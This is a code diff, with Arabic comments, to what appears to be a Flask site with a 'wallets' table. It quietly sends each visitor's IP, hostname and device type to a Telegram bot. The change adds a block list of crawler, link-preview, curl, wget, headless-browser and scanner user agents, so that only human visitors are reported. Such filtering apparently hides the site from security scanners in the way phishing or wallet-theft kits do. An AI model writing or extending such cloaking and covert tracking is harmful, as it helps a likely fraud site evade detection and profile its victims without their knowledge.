@@ -5,6 +5,7 @@ import secrets
 from datetime import datetime
 import requests
 import socket
+import re
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
@@ -21,6 +22,16 @@ c.execute('''CREATE TABLE IF NOT EXISTS wallets
      created_at TEXT)''')
 conn.commit()
 
+# قائمة بوتات معروفة
+BOTS = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java', 'http', 'scan', 'twitterbot', 'facebook', 'telegram', 'whatsapp', 'discord', 'slack', 'preview', 'googlebot', 'bingbot', 'yandex', 'baidu', 'duckduck', 'ahrefs', 'semrush', 'majestic', 'rogerbot', 'dotbot', 'slurp', 'archiver', 'screenshot', 'puppeteer', 'headless', 'selenium', 'phantom']
+
+def is_bot(ua):
+    ua_lower = ua.lower()
+    for bot in BOTS:
+        if bot in ua_lower:
+            return True
+    return False
+
 def send_tg(msg):
     try:
         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
@@ -30,16 +41,26 @@ def send_tg(msg):
 
 @app.route('/')
 def index():
-    # تتبع الزائر
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     ua = request.headers.get('User-Agent', 'Unknown')
     ref = request.headers.get('Referer', 'Direct')
-    try:
-        hostname = socket.gethostbyaddr(ip)[0] if ip else 'Unknown'
-    except:
-        hostname = 'Unknown'
     
-    send_tg(f"👁️ زيارة جديدة!\n🌐 IP: {ip}\n📍 DNS: {hostname}\n📱 {ua[:60]}...\n🔗 {ref}")
+    # تخطي البوتات
+    if not is_bot(ua):
+        try:
+            hostname = socket.gethostbyaddr(ip)[0] if ip else 'Unknown'
+        except:
+            hostname = 'Unknown'
+        
+        # نبذة عن الجهاز
+        device = 'Unknown'
+        if 'Android' in ua: device = '📱 Android'
+        elif 'iPhone' in ua: device = '📱 iPhone'
+        elif 'Windows' in ua: device = '💻 Windows'
+        elif 'Mac' in ua: device = '💻 Mac'
+        elif 'Linux' in ua: device = '🐧 Linux'
+        
+        send_tg(f"👁️ زائر حقيقي!\n{device}\n🌐 IP: {ip}\n📍 {hostname}")
     
     return render_template('index.html')
 
